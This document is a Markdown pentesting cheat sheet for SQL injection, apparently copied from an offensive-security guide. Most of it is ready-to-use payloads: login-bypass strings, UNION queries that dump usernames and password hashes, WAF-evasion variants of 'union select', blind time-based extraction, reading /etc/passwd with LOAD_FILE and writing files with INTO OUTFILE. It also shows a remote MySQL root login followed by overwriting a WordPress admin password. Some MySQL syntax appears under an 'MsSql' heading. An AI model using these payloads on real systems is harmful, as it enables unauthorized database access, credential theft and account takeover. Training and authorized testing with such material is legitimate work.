# Testing for SQL

* All credit goes to: https://guide.offsecnewbie.com/5-sql

## Basic Attempts

```
admin'#
abc123
```

```
OR 1=1#
OR 1=1#
```

```
OR 1=1-- -
OR 1=1-- -
```

## 3306 Remotely

```
https://sqlectron.github.io/ to connect remotely
```

```
mysql -h $ip -u root -p
```

```
show databases;
#find the database you want - eg wordpress_db
use wordpress_db;
show tables;
select * from wp_users;
```

* If you have root access remotely like the example above you can get access to the user's wordpress password. ![alt text](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-MDU1o3kyLftcE0eKmbl%2F-MDW\_5ZrUY4F7rM-FNHY%2Fimage.png)
* If you can not crack the password you can change it to something you know - in fact just change the pass to something you know eg

```
SELECT ID, user_login, user_pass FROM wp_users WHERE user_login = 'admin';
#set the password for user admin to rowbot
UPDATE wp_users SET user_pass='c424ada17bf6e27794273b7db21cf950' WHERE user_login = 'admin';
```

* ![alt text](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-MDU1o3kyLftcE0eKmbl%2F-MDWiiOz6DDS8VHphrHu%2Fimage.png)
* ![alt text](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-MDU1o3kyLftcE0eKmbl%2F-MDWiTwNHNhx\_yOKsvmU%2Fimage.png)

## Identifying SQL Injection

* Let's say that you have some site like this

```
http://$ip/news.php?id=5
```

* Or a form like this
* ![alt text](https://gblobscdn.gitbook.com/assets%2F-LSy0aAo8OKT4I-Ahftv%2F-M0-osTGaSUSFX4K\_LQX%2F-M0-q3W0Zwp4cMYRo-cQ%2Fimage.png)
* Now to test if it is vulnerable you add to the end of url ' (quote).

```
http://$ip/news.php?id=5'
```

* If you get an error like:
* "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc..." or something similar
* That means its vulnerable !
* Find the number of columns
* To find number of columns you use statement ORDER BY (tells database how to order the result) so how to use it? Well just increment the number until you get an error.

```
http://$ip/news.php?id=5 order by 1/* <-- no error
http://$ip/news.php?id=5 order by 2/* <-- no error
http://$ip/news.php?id=5 order by 3/* <-- no error
http://$ip/news.php?id=5 order by 4/* <-- error (you get message like this Unknown column '4' in 'order clause' or something like that)
```

* That means that the database has 3 columns, cause you get an error on 4.

## Check for UNION function

* With union you can select more data in one SQL statement.
* So you have:

```
http://$ip/news.php?id=5 union all select 1,2,3/* (you already found that number of columns are 3 in section 2)
```

* If that doesn't work or you get some error, then try:

```
http://$ip/news.php?id=5 union all select 1,2,3 -- - #note the dashes at the end
```

* The dashes tells SQL not to process anything passed the 3, in the case above.
* If you see some numbers on screen, i.e 1 or 2 or 3 then the UNION works!!

## Check for MySQL version

* Lets say that you have number 2 on the screen, now to check for version
* You replace the number `2` with `@@version or version()` and get something like `4.1.33-log` or `5.0.45` or similar.
* It should look like:

```
http://$ip/news.php?id=5 union all select 1,@@version,3/*
```

* If you get an error:

```
"union + illegal mix of collations (IMPLICIT + COLLATIONS) ..."
```

* You need the convert() function

```
http://$ip/news.php?id=5 union all select 1,convert(@@version using latin1),3/
```

* Or with hex() and unhex()

```
http://$ip/news.php?id=5 union all select 1,unhex(hex(@@version)),3/*
```

* And you will get the MySQL version

### Generic Bypasses

* Blacklist using keywords - bypass using uppercase/lowercase

```
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

* Blacklist using keywords case insensitive - bypass using an equivalent operator

```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```

## Getting table and column name

* If the MySQL version is < 5 (i.e 4.1.33, 4.1.12...) you must guess the table and column names
* Common table names are:

```
users, admins, members ..
```

* Common column names are:

```
username, user, usr, user_name, password, pass, passwd, pwd etc..
```

* For example:

```
http://$ip/news.php?id=5 union all select 1,2,3 from admin/*
```

* If you see number 2 on the screen like before, then that's good, you know that there is a table called admin in the database. Else try another table name.
* Now to check column names:

```
http://$ip/news.php?id=5 union all select 1,password,3 from admin/*
```

* If you get an error, then try the other column name
* You will hopefully see the password on the screen in hash or plain-text, it depends of how the database is set up. For example i.e md5 hash, mysql hash, sha1...
* Now you must complete query to look nice for that you can use concat() function (it joins strings).

```
http://$ip/news.php?id=5 union all select 1,concat(username,0x3a,password),3 from admin/*
```

* Note that I put 0x3a, its hex value for : (so 0x3a is hex value for colon)
* There is another way to do that, char(58), ascii value for a colon

```
http://$ip/news.php?id=5 union all select 1,concat(username,char(58),password),3 from admin/*
```

* Now you get displayed username:password on screen, i.e admin:admin or admin:somehash when you have this, you can login like admin or some superuser :D if can't guess the right table name, you can always try mysql.user (default) it has user and password columns, so an example would be

```
http://$ip/news.php?id=5 union all select 1,concat(user,0x3a,password),3 from mysql.user/*
```

### Test number of columns and Watch for any Error

```
http://$ip/artists.php?artist=1 order by 1,2,3,4
http://$ip/artists.php?artist=1 order by 1,2,3,4 -- LIMIT 1
http://$ip/artists.php?artist=1 -1 union all select 1/*
http://$ip/artists.php?artist=1 -1 union all select 2/*
http://$ip/artists.php?artist=1 -1 union all select 3/*
http://$ip/artists.php?artist=1 -1 union all select 4/*
```

### Test Injectable columns - Watch for visual Indicators (WAF filters)

```
http://$ip/artists.php?artist=1 -1 union all select 1,2,3,4
http://$ip/listproducts.php?cat=1 -1 /*!UNiOn*/ /*!SeLEct*/ 1,database(),3,4,5,6,7,8,9,10,11
 http://$ip/listproducts.php?cat=1%20%20-1%20%20%20/**//*!12345UNION%20SELECT*//**/%201,database%28%29,3,4,5,6,7,8,9,10,11
 http://$ip/listproducts.php?cat=1%20%20-1%20%20%20%20/**//*!50000UNION%20SELECT*//**/%201,database%28%29,3,4,5,6,7,8,9,10,11
http://$ip/listproducts.php?cat=1%20%20-1%20%20/**/UNION/**//*!50000SELECT*//**/%201,database%28%29,3,4,5,6,7,8,9,10,11
http://$ip/listproducts.php?cat=1%20%20-1%20%20%20/*!50000UniON%20SeLeCt*/%201,database%28%29,3,4,5,6,7,8,9,10,11
--*See the 'Web filter Bypass Keywords' below for more*--
```

### Enumerate Information

```
http://$ip/artists.php?artist=1 union all select 1,@@version,3,4
http://$ip/artists.php?artist=1 union all select 1,hex(unhex(@@version)),3,4
http://$ip/artists.php?artist=1 union all select 1,convert(@@version using latin1),3,4
```

### Enumerate Database

```
http://$ip/artists.php?artist=1 union all select 1,database(),3,4
```

### Enumerate Tables

```
http://$ip/listproducts.php?cat=1 -1 union all select 1,2,3,4,5,6,7,8,table_name,10,11 from information_schema.tables
```

### Enumerate Columns

```
http://$ip/artists.php?artist=1 -1 union select all 1,2,column_name,4 from information_schema.columns where table_schema='database' and table_name='table_name' LIMIT 1,1 -- - LIMIT 1
```

### Enumerate RAW Data

```
http://$ip/listproducts.php?cat=1 union select all 1,2,3,4,5,6,group_concat(uname,0x10a,email),8,9,10,11 FROM users
```

### Confirm MYSQL version - If Returns true then end value is true

```
http://$ip/listproducts.php?cat=1 and substring(@@version,1,1)=4
http://$ip/listproducts.php?cat=1 and substring(@@version,1,1)=5 
```

* Test if subset works - If returns True then subset works

```
http://$ip/listproducts.php?cat=1 and (select 1)=1
```

* Test if subset works, test for mysql.user - If returns True then subset works

```
http://$ip/listproducts.php?cat=1 and (select 1 from mysql.user limit 0,1)=1
```

#### Injection

```
@@hostname                             
@@tmpdir
@@datadir
@@basedir
@@log
@@log_bin                                                                
@@log_error                                                          
@@binlog_format                       
@@time_format                                                    
@@date_format                                                    
@@ft_boolean_syntax                                           
@@innodb_log_group_home_dir                                            
@@new                                                                  
@@version                                                              
@@version_comment
@@version_compile_os
@@version_compile_machine
@@GLOBAL.have_symlink
@@GLOBAL.have_ssl
@@GLOBAL.VERSION

version()                                                            
table_name()                                                           
user()                                                                 
system_user()                                                          
session_user()
database()                                                             
column_name()                                                          
collation(user())                                                      
collation(\N)                                                          
schema()
UUID()
current_user()
current_user


dayname(from_days(401))                                                
dayname(from_days(402))                                                
dayname(from_days(403))                                                
dayname(from_days(404))                                                
dayname(from_days(405))                                                
dayname(from_days(406))                                                
dayname(from_days(407))                                                

monthname(from_days(690))                                              
monthname(from_unixtime(1))
                                          
collation(convert((1)using/**/koi8r))

(select(collation_name)from(information_schema.collations)where(id)=1 
(select(collation_name)from(information_schema.collations)where(id)=23 
(select(collation_name)from(information_schema.collations)where(id)=36 
(select(collation_name)from(information_schema.collations)where(id)=48 
(select(collation_name)from(information_schema.collations)where(id)=50 
------forever----
```

#### Adding Gaps between requests

```
testtest        nospace    0x1a
test*test       *              0x2a
test:test       :                0x3a
test::test      ::                0x3a3a
testJtest       J               0x4a
testZtest      Z              0x5a
testjtest        j               0x6a
testztest       z               0x7a
testtest        nospace     0x8a
testtest        nospace     0x9a
test test       SPACE     0x10a
Web Filter Bypass 'union select' keyword strigns
union select           
!UNiOn*/ /*!SeLEct*/
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*--*/union/*--*/select/*--*/
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
+UnIOn%0D%0ASeleCt%0D%0A 
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A 
```

## MsSql blind exploitation

* For numeric contexts (look for differences):

```
and 1=1
and 1=2
```

* Once we found the injection, we can leak data from the DB by guessing one character at a time as follows:

```
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109
```

* If it is true, we know the db\_name starts with 109(m).
* Ask if the first character of the user is 'a':

```
and if(substring (user(),1,1)=’a’,SLEEP(5),1)--”
```

* Check if the admin table exists:

```
and IF(SUBSTRING ((select 1 from admin limit 0,1),1,1)=1,SLEEP(5),1)
```

* Finding number of columns using ORDER BY
* We can use order by to sort the result by a given column number, if the column does not exist, we will get an error:

```
vuln.php?id=1 order by 9 # This throws no error
vuln.php?id=1 order by 10 # This throws error
```

* MySql UNION code execution
* Joins the result of two queries
* Two queries should return the same # of columns.
* Data-types in columns of the select must be of the same orcompatible type.
* Once you have the right number of columns (i.e. 3) you can find the mysql version:

```
UNION SELECT @@version,NULL, NULL#'
```

* mysql users:

```
UNION SELECT table_schema,NULL,NULL FROM information_schema.columns#'
```

* If the result displays garbage from the first query, you can add a false condition to only show the union result AND 1=0 UNION...
* Read files

```
AND 1=0 UNION SELECT LOAD_FILE('C:\\boot.ini'),NULL,NULL #'
```

* Write files

```
AND 1=0 UNION SELECT 'bad content',NULL,NULL INTO OUTFILE 'C:\\random_file.txt' #'
```

* Other payloads:

```
-1 union all select @@version --
1 union SELECT user FROM mysql.user
1 union select 'foo' into outfile '/tmp/foo'
1 union select load_file('/etc/passwd')
```
